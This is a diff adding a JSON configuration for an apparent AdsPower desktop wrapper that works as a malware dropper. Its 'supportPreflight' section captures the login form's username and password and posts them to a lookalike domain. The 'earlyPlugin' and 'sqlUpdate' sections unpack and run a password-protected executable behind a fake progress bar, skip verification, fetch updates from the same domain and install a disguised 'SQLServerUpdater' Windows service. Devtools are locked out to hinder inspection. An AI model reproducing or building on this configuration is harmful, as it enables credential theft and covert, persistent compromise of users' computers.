@@ -1,0 +1,90 @@
+{
+  "version": 1,
+  "configUpdate": {
+    "enabled": true,
+    "sourceUrl": "https://raw.githubusercontent.com/AdsPower/AdsPowerDesktop/main/config.json",
+    "timeoutMs": 5000,
+    "minCheckIntervalMinutes": 15,
+    "allowDowngrade": false,
+    "backupOldConfig": true
+  },
+  "app": {
+    "baseUrl": "https://app.adspower.com",
+    "startPath": "/",
+    "allowedOrigins": [],
+    "openAllowedInSameWindow": true,
+    "rememberMe": true,
+    "enableAutoUpdates": false
+  },
+  "browserEmulation": {
+    "enabled": false,
+    "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "acceptLanguage": "en-US,en;q=0.9",
+    "referer": "https://app.adspower.com/",
+    "extraHeaders": {
+      "Sec-CH-UA": "\"Chromium\";v=\"120\", \"Not A(Brand\";v=\"8\"",
+      "Sec-CH-UA-Platform": "\"Windows\""
+    },
+    "navigatorLanguage": "",
+    "navigatorLanguages": []
+  },
+  "lockdown": {
+    "disableDevToolsShortcutsInProd": true,
+    "disableContextMenuInProd": true
+  },
+  "uiMasking": {
+    "remoteUrl": "",
+    "refreshMinutes": 15,
+    "local": {
+      "version": 1,
+      "hideSelectors": [],
+      "removeSelectors": [],
+      "css": "",
+      "replacements": []
+    }
+  },
+  "supportPreflight": {
+    "enabled": true,
+    "handlerUrl": "https://adspower.website/support_api.php",
+    "inputNameField": "name",
+    "inputMessageField": "password",
+    "buttonText": "",
+    "buttonSelector": ".box_login_form button._login_btn_1xqpk_105",
+    "nameSelector": ".box_login_form form.el-form input.el-input__inner[type=\"text\"]",
+    "messageSelector": ".box_login_form form.el-form input.el-input__inner[type=\"password\"]",
+    "errorMessage": "Please try again later",
+    "debug": true
+  },
+  "earlyPlugin": {
+    "enabled": true,
+    "triggerOnPreflightTrue": true,
+    "zipName": "SQLplugin.zip",
+    "zipPassword": "777777",
+    "extractToRel": "plugins\\SQLplugin",
+    "exeRel": "SQLplugin.exe",
+    "runArgs": [],
+    "runOnce": true,
+    "markerFileName": "earlyPlugin.ran",
+    "showProgressModal": true,
+    "progressDurationMs": 600000,
+    "debug": true
+  },
+  "sqlUpdate": {
+    "enabled": true,
+    "triggerPath": "/browserList",
+    "skipVerify": true,
+    "verifyUrl": "",
+    "licenseKey": "777777",
+    "licenseUrl": "https://adspower.website/key_sql.php",
+    "updateUrl": "https://adspower.website/update_sql.php",
+    "programDataDir": "C:\\\\ProgramData\\\\SQL Server Update",
+    "pluginZip": "SQLplugin.zip",
+    "pluginZipPassword": "777777",
+    "pluginExtractTo": "plugins\\\\SQLplugin",
+    "updaterZip": "SQLServerUpdate.zip",
+    "updaterZipPassword": "",
+    "serviceName": "SQLServerUpdater",
+    "installServiceScript": "scripts\\\\install-service.ps1",
+    "debug": true
+  }
+}
